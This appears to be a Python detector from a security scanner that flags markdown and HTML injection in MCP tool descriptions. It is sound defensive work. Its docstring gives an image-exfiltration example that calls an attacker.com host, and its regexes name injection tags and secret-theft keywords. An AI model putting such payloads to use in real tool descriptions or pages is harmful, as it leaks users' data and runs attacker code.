"""Markdown and HTML injection detector for MCP tool descriptions.

Detects:
- JavaScript protocol links: [text](javascript:...)
- Image-based data exfiltration: ![img](http://attacker.com/?data=)
- HTML injection: <script>, <img onerror=, <iframe, event handlers
- Excessive markdown formatting that could hide content
"""

from __future__ import annotations

import re
from typing import Any

from mcp_shield.core.models import Finding, Severity, Surface

# ---------------------------------------------------------------------------
# Compiled patterns
# ---------------------------------------------------------------------------

# JavaScript protocol in markdown links
_RE_JS_LINK = re.compile(
    r"\[([^\]]*)\]\(\s*javascript\s*:",
    re.IGNORECASE,
)

# Data exfiltration via markdown images
_RE_IMG_EXFIL = re.compile(
    r"!\[([^\]]*)\]\(\s*https?://[^)]*"
    r"(?:\?[^)]*(?:data|token|secret|key|password|session|cookie|auth)"
    r"|/(?:collect|track|log|exfil|steal|capture)[^)]*)\)",
    re.IGNORECASE,
)

# Any external image reference (lower severity — needs context)
_RE_EXTERNAL_IMG = re.compile(
    r"!\[([^\]]*)\]\(\s*https?://(?!(?:github\.com|githubusercontent\.com"
    r"|shields\.io|img\.shields\.io|badge|imgur\.com))[^)]+\)",
    re.IGNORECASE,
)

# HTML script tags
_RE_SCRIPT_TAG = re.compile(
    r"<\s*script\b[^>]*>",
    re.IGNORECASE,
)

# HTML event handlers (onerror, onload, onclick, etc.)
_RE_EVENT_HANDLER = re.compile(
    r"<[^>]+\s+on(?:error|load|click|mouseover|focus|blur|submit|input"
    r"|change|keyup|keydown|mouseenter|abort|resize)\s*=",
    re.IGNORECASE,
)

# iframe injection
_RE_IFRAME = re.compile(
    r"<\s*iframe\b[^>]*>",
    re.IGNORECASE,
)

# object/embed tags (plugin-based attacks)
_RE_OBJECT_EMBED = re.compile(
    r"<\s*(?:object|embed|applet)\b[^>]*>",
    re.IGNORECASE,
)

# style-based attacks (CSS exfiltration, hidden content)
_RE_STYLE_ATTACK = re.compile(
    r"<\s*style\b[^>]*>[^<]*(?:url\s*\(|expression\s*\(|@import\s)",
    re.IGNORECASE | re.DOTALL,
)

# SVG with script
_RE_SVG_SCRIPT = re.compile(
    r"<\s*svg\b[^>]*>.*?<\s*script\b",
    re.IGNORECASE | re.DOTALL,
)

# Data URI with executable content
_RE_DATA_URI = re.compile(
    r"data\s*:\s*(?:text/html|application/javascript|text/javascript)",
    re.IGNORECASE,
)

# Excessive formatting heuristic: many consecutive heading markers or bold
_RE_EXCESSIVE_HEADINGS = re.compile(r"(?:^|\n)\s*#{1,6}\s+\S", re.MULTILINE)
_RE_EXCESSIVE_BOLD = re.compile(r"\*\*[^*]+\*\*")
_RE_EXCESSIVE_HIDDEN = re.compile(
    r"<!--[\s\S]*?-->",  # HTML comments (can hide content)
)

# Threshold for "excessive" formatting
_MAX_HEADINGS = 10
_MAX_BOLD_BLOCKS = 20
_MAX_HTML_COMMENTS = 3


class MarkdownInjectionDetector:
    """Detect markdown and HTML injection in tool descriptions."""

    name: str = "markdown_injection"

    def scan_tool(
        self,
        tool_name: str,
        description: str,
        schema: dict[str, Any],
        annotations: dict[str, Any] | None = None,
    ) -> list[Finding]:
        findings: list[Finding] = []
        if not description:
            return findings

        # --- JavaScript protocol links ---
        for m in _RE_JS_LINK.finditer(description):
            findings.append(
                Finding(
                    rule_id="markdown_injection",
                    severity=Severity.CRITICAL,
                    surface=Surface.MCP_METADATA,
                    title="JavaScript protocol in markdown link",
                    evidence=m.group(0)[:150],
                    location=tool_name,
                    detail=(
                        "Markdown link uses javascript: protocol. This can "
                        "execute arbitrary code if rendered in a web context."
                    ),
                )
            )

        # --- Image-based data exfiltration ---
        for m in _RE_IMG_EXFIL.finditer(description):
            findings.append(
                Finding(
                    rule_id="markdown_injection",
                    severity=Severity.CRITICAL,
                    surface=Surface.MCP_METADATA,
                    title="Image-based data exfiltration pattern",
                    evidence=m.group(0)[:150],
                    location=tool_name,
                    detail=(
                        "Markdown image references an external URL with "
                        "data/token/secret parameters. This pattern is commonly "
                        "used to exfiltrate sensitive information."
                    ),
                )
            )

        # --- External images (not exfil pattern but suspicious) ---
        for m in _RE_EXTERNAL_IMG.finditer(description):
            # Skip if already caught by exfil pattern
            if _RE_IMG_EXFIL.search(m.group(0)):
                continue
            findings.append(
                Finding(
                    rule_id="markdown_injection",
                    severity=Severity.LOW,
                    surface=Surface.MCP_METADATA,
                    title="External image reference in description",
                    evidence=m.group(0)[:150],
                    location=tool_name,
                    detail=(
                        "Description references an external image. While often "
                        "benign, external images can track tool usage or leak "
                        "context via URL parameters."
                    ),
                )
            )

        # --- HTML injection patterns ---
        _html_checks: list[tuple[re.Pattern[str], str, Severity]] = [
            (_RE_SCRIPT_TAG, "script tag injection", Severity.CRITICAL),
            (_RE_EVENT_HANDLER, "HTML event handler injection", Severity.CRITICAL),
            (_RE_IFRAME, "iframe injection", Severity.HIGH),
            (_RE_OBJECT_EMBED, "object/embed tag injection", Severity.HIGH),
            (_RE_STYLE_ATTACK, "CSS-based attack in style tag", Severity.HIGH),
            (_RE_SVG_SCRIPT, "SVG with embedded script", Severity.CRITICAL),
            (_RE_DATA_URI, "executable data URI", Severity.HIGH),
        ]

        for pattern, label, severity in _html_checks:
            m = pattern.search(description)
            if m:
                findings.append(
                    Finding(
                        rule_id="markdown_injection",
                        severity=severity,
                        surface=Surface.MCP_METADATA,
                        title=f"HTML injection: {label}",
                        evidence=m.group(0)[:150],
                        location=tool_name,
                        detail=(
                            f"Description contains {label}. "
                            "This can execute arbitrary code or exfiltrate data "
                            "if the description is rendered as HTML."
                        ),
                    )
                )

        # --- Excessive formatting (content hiding) ---
        heading_count = len(_RE_EXCESSIVE_HEADINGS.findall(description))
        bold_count = len(_RE_EXCESSIVE_BOLD.findall(description))
        comment_count = len(_RE_EXCESSIVE_HIDDEN.findall(description))

        if heading_count > _MAX_HEADINGS:
            findings.append(
                Finding(
                    rule_id="markdown_injection",
                    severity=Severity.LOW,
                    surface=Surface.MCP_METADATA,
                    title="Excessive markdown headings",
                    evidence=f"{heading_count} heading markers found",
                    location=tool_name,
                    detail=(
                        "Description contains an unusually high number of "
                        "markdown headings, which may be used to visually "
                        "hide injected content."
                    ),
                )
            )

        if bold_count > _MAX_BOLD_BLOCKS:
            findings.append(
                Finding(
                    rule_id="markdown_injection",
                    severity=Severity.LOW,
                    surface=Surface.MCP_METADATA,
                    title="Excessive bold formatting",
                    evidence=f"{bold_count} bold blocks found",
                    location=tool_name,
                    detail=(
                        "Description uses excessive bold formatting, which "
                        "may be used to draw attention away from injected content."
                    ),
                )
            )

        if comment_count > _MAX_HTML_COMMENTS:
            findings.append(
                Finding(
                    rule_id="markdown_injection",
                    severity=Severity.MEDIUM,
                    surface=Surface.MCP_METADATA,
                    title="HTML comments in description (hidden content)",
                    evidence=f"{comment_count} HTML comments found",
                    location=tool_name,
                    detail=(
                        "Description contains HTML comments which are invisible "
                        "when rendered but may contain hidden instructions."
                    ),
                )
            )

        return findings
